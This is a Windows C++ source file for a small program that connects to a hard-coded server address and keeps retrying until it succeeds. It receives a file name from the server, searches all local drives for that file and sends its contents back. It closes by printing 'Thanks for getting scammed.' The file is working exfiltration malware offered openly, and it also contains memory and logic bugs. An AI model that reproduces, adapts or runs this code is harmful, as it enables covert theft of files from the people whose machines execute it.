#include "pch.h"
#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

char getDiskLetter(int diskNum) {
	switch (diskNum) {
	case 1:
		return 'A';
	case 2:
		return 'B';
	case 4:
		return 'C';
	case 8:
		return 'D';
	case 16:
		return 'E';
	case 32:
		return 'F';
	}
	return '-';
}

char *findFile(const char* path, const char *fileName) {

	HANDLE handleFind;
	WIN32_FIND_DATAA info;
	std::string pathHelper;

	handleFind = FindFirstFileA(path, &info);

	if (handleFind != INVALID_HANDLE_VALUE) {
		do {
			if ((info.cFileName[0] != '.' && info.cFileName[1] != '\0') &&
				(info.cFileName[0] != '.' && info.cFileName[1] != '.' && info.cFileName[2] != '\0')) {
				
				if (strcmp(info.cFileName, fileName) == 0 && info.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
					pathHelper = path;
					pathHelper.pop_back();
					pathHelper += info.cFileName;
					char *file = new char[pathHelper.length()];
					strcpy(file, pathHelper.c_str());
					return file;
				}

				if (info.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
					pathHelper = path;
					pathHelper.pop_back();
					pathHelper += info.cFileName;
					pathHelper += "\\*";
					char *filePath = findFile(pathHelper.c_str(), fileName);
					if (filePath != nullptr)
						return filePath;
				}
			}
		} while (FindNextFileA(handleFind, &info));

		FindClose(handleFind);
	}
	return nullptr;
}

int main()
{
	WSADATA wsas;
	int error;
	WORD ver;
	ver = MAKEWORD(2, 0);
	error = WSAStartup(ver, &wsas);
	if (error != 0) {
		WSACleanup();
		return -1;
	}

	SOCKET server;
	server = socket(AF_INET, SOCK_STREAM, 0);
	if (server == INVALID_SOCKET) {
		WSACleanup();
		return -2;
	}

	struct sockaddr_in sa;
	memset((void *)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(8080);
	sa.sin_addr.s_addr = inet_addr("192.168.0.16");

	error = connect(server, (struct sockaddr FAR*)&sa, sizeof(sa));
	while (error == SOCKET_ERROR)
		error = connect(server, (struct sockaddr FAR*)&sa, sizeof(sa));

	std::cout << "Connected" << std::endl;
	//TODO client behavior
	char fileSearch[256];
	for (int i = 0; i < 256; i++)
		fileSearch[i] = 0;
	recv(server, fileSearch, 256, 0);

	DWORD disk = GetLogicalDrives();
	char *filePath = nullptr;
	std::cout << "Looking for file: " << fileSearch << std::endl;
	for (int i = 1; i < 32; i *= 2) {
		if ((disk & i) != 0) {
			std::string startPath;
			startPath += getDiskLetter(i);
			std::cout << "Looking at disk " << startPath << std::endl;
			startPath += ":\\*";
			filePath = findFile(startPath.c_str(), fileSearch);
			if (filePath != nullptr)
				break;
		}
	}

	if (filePath != nullptr) {
		std::cout << "File found" << std::endl;
		FILE *fileToSend = fopen(filePath, "rb");
		if (fileToSend != nullptr) {
			char buff[4096];
			long sent = 0;
			std::cout << "Sending..." << std::endl;
			while (!feof(fileToSend)) {
				int read;
				if ((read = fread(&buff, 1, 4096, fileToSend)) != 0)
					sent += send(server, buff, read, 0);
			}
			fclose(fileToSend);
			std::cout << "File sent" << std::endl;
		}
		else
			std::cout << "Error opening file" << std::endl;
	}
	else
		std::cout << "File not found" << std::endl;
	
	std::cout << "Thanks for getting scammed.";
	return 0;
}

